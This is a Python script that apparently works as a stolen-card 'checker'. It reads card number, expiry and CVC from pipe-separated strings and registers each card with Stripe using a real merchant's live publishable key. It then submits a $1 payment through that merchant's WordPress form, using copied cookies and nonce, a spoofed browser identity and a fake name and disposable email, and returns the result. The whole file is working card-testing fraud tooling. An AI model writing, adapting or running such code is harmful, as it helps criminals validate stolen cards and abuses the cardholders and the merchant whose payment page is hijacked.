import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fd7f2cc0ba1%3B+stripe-js-v3%2Fd7f2cc0ba1%3B+card-element&referrer=https%3A%2F%2Fthechizone.com&time_on_page=98958&key=pk_live_51PQdgUS2xipZPmxGS2ZKc34G03vgqRsiP8h2ceKNVdxf3uaaTqMQwXGdY4LZ4IZW6whexYuQMNW0M7dc00k0lMgw00jwWmAry8'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    'et_pb_ab_view_page_987508477': '702e88298c1f6bfddfb2d65fc05e44d6',
	    '_ga_J0C9YTE7L9': 'GS1.1.1734184751.1.0.1734184751.0.0.0',
	    '_ga': 'GA1.1.1198194357.1734184751',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-12-14%2013%3A59%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fthechizone.com%2Fpayment-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_first_add': 'fd%3D2024-12-14%2013%3A59%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fthechizone.com%2Fpayment-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
	    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Mobile%20Safari%2F537.36',
	    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthechizone.com%2Fpayment-page%2F',
	    'et_pb_ab_read_page_987508477false': 'true',
	    'pum-987507163': 'true',
	    '__stripe_mid': 'a1d9cfd9-3459-45e7-ac9b-067fc0cb2eff8f85d2',
	    '__stripe_sid': 'd4c6c2eb-cc26-4032-9249-460021f4de64af57b6',
	}
	
	headers = {
	    'authority': 'thechizone.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'et_pb_ab_view_page_987508477=702e88298c1f6bfddfb2d65fc05e44d6; _ga_J0C9YTE7L9=GS1.1.1734184751.1.0.1734184751.0.0.0; _ga=GA1.1.1198194357.1734184751; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-14%2013%3A59%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fthechizone.com%2Fpayment-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2024-12-14%2013%3A59%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fthechizone.com%2Fpayment-page%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F116.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fthechizone.com%2Fpayment-page%2F; et_pb_ab_read_page_987508477false=true; pum-987507163=true; __stripe_mid=a1d9cfd9-3459-45e7-ac9b-067fc0cb2eff8f85d2; __stripe_sid=d4c6c2eb-cc26-4032-9249-460021f4de64af57b6',
	    'origin': 'https://thechizone.com',
	    'pragma': 'no-cache',
	    'referer': 'https://thechizone.com/payment-page/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1734184852968',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=987507826&_fluentform_30_fluentformnonce=da5a43b8e2&_wp_http_referer=%2Fpayment-page%2F&names%5Bfirst_name%5D=Vinsmoke&names%5Blast_name%5D=Sanji&email=wixaras947%40ikowat.com&custom-payment-amount=1&input_text=General&payment_method_1=stripe&item__30__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '30',
	}
	
	r2 = requests.post(
	    'https://thechizone.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())